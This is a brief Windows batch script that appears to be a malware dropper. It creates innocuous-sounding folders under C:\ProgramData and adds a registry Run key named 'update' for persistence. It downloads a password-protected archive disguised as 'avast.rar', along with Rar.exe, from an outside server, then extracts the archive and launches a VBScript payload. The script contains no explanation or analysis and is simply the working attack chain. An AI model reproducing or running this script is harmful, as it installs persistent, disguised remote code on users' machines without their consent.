mkdir C:\ProgramData\system
mkdir C:\ProgramData\windows
cd C:\ProgramData\system
echo y | REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "update" /t REG_SZ /F /D "C:\ProgramData\windows\setting.lnk"

curl -O http://server441.net/avast.rar
curl -O http://server441.net/Rar.exe
rar x -o+ -pQwertyuiop@123 C:\ProgramData\system\avast.rar C:\ProgramData\windows\
cd C:\ProgramData\windows
start C:\ProgramData\windows\start.vbs